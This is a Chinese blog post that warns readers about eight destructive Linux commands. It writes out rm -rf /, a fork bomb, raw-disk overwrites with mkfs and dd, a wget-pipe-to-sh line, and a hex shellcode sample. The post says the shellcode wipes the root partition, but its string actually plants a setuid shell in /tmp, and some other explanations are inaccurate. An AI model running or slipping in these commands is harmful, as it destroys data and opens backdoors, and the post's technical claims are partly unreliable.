# 八个最致命的Linux命令！ - zhusongziye的博客 - CSDN博客





2018年11月24日 10:17:30[zhusongziye](https://me.csdn.net/zhusongziye)阅读数：202标签：[八个最致命的Linux命令！](https://so.csdn.net/so/search/s.do?q=八个最致命的Linux命令！&t=blog)
个人分类：[linux知识](https://blog.csdn.net/zhusongziye/article/category/7309653)









*新建Python软件开发测试技术交友群QQ:952490269（加群备注software）*

**1，rm -rf Command**

![](https://img-blog.csdnimg.cn/20181124100508655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll,size_16,color_FFFFFF,t_70)

rm -rf命令是删除文件夹及其内容的最快方法之一。但是一点点错字或失误可能会导致不可恢复的系统损坏。与rm命令一起使用的一些选项是：

rm 命令用于删除文件。
rm -r命令以递归方式删除文件夹，甚至是空文件夹。
rm -f命令在不询问的情况下删除“只读文件”。
rm -rf /：强制删除根目录中的所有内容。
rm -rf *：强制删除当前目录/工作目录中的所有内容
rm -rf. ：强制删除当前文件夹和子文件夹。
rm -rf ~将删除主文件夹中的所有文件，
而rm -rf .*将删除所有配置文件。

因此，执行rm -rf命令时要小心。如果通过'rm'命令来克服意外删除文件，可以在“.bashrc”文件中创建'rm'命令的别名为'rm -i'，它会要求确认每次删除。



**2,:(){:|:&};:**

![](https://img-blog.csdnimg.cn/20181124100759281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll,size_16,color_FFFFFF,t_70)

以上实际上是一个fork炸弹。它通过定义一个名为'：'的函数来运行，该函数调用自身两次，一次在前台，一次在后台。它一直持续执行，直到系统冻结。

:(){:|:&};:

这短短的一行定义了一个shell函数，它可以创建自己的新副本。进程不断地复制自己，它的副本不断地复制自己，很快地占用了所有的CPU时间和内存。这会导致你的主机死机。这基本上是一种拒绝服务攻击。



**3，command > /dev/sda**

上面的命令将'command'的输出写入块/ dev / sda。它运行一个命令并将该命令的输出直接发送到第一个硬盘驱动器，将数据直接写入硬盘驱动器并损坏文件系统。

command - 运行命令（可以是任何命令。）
/ dev / sda - 将命令的输出直接写入硬盘设备。

块上的所有文件将被原始数据替换，从而导致块上的数据完全丢失。



**4，mv folder /dev/null**

上面的命令会将'folder'移动到/ dev / null。在Linux ，dev / null或null是一个特殊文件，它丢弃写入它的所有数据并报告写操作成功。例如：

mv~ / dev / null - 将您的主目录移动到黑洞

mv - 将以下文件或目录移动到另一个位置。 

〜 - 表示整个主文件夹。 

/ dev / null - 将您的主文件夹移动到/ dev / null，销毁所有文件并删除原始副本。



**5，wget http://example.com/something -O- | sh**

上面的命令从Web下载脚本并将其发送到sh，后者执行脚本的内容。

wget -下载一个文件。

http://example.com/something——从这个位置下载文件。

| 将wget命令(您下载的文件)的输出直接发送到另一个命令。

sh -将文件发送到sh命令，如果是bash脚本，sh命令就会执行它。

如果您不确定脚本是什么，或者您不信任其来源，那么这可能很危险 - 不要运行不受信任的脚本。



**6. mkfs.ext3 /dev/sda**

上面的命令将格式化块'sda'，你肯定会知道执行上述命令后你的Block（硬盘驱动器）将是新的，全新的！没有任何数据，将您的系统置于不可恢复的阶段。

mkfs.ext3 /dev/sda

总而言之，此命令可以等同于在Windows上运行格式c：它将擦除第一个分区上的文件并用新文件系统替换它们。



**7，dd if=/dev/random of=/dev/sda**

上面的命令将清除块sda并将随机垃圾数据写入块。

dd if=/dev/random of=/dev/sda

当然！您的系统将处于不一致且不可恢复的阶段。



**8，被隐藏的命令**

以下命令只是上面的第一个命令（rm -rf）。这里的代码以十六进制隐藏，以便无知的用户可能被欺骗。在终端中运行以下代码将擦除根分区。

```bash
char esp[] __attribute__ ((section(“.text”))) /* e.s.p
release */
= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
```


这种被隐藏的危险命令，通常无法被检测到。你必须知道你在做什么以及结果会是什么。不要编译或者运行来自未知来源的代码。


